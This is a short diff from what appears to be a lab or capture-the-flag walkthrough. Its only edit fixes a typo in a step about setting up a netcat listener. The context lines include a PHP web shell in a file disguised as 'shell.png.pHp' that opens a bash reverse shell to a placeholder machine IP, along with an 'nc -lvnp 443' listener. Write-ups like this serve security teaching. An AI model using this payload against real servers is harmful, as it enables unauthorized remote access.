@@ -279,7 +279,7 @@ Contents of shell.png.pHp :-
 �
 <?php echo system("bash -c 'bash -i >& /dev/tcp/VIRTUAL MACHINE IP/443 0>&1'");
 
-3) Setup a netcat listenser and use curl command once again.
+3) Setup a netcat listener and use curl command once again.
 
 nc -lvnp 443
 
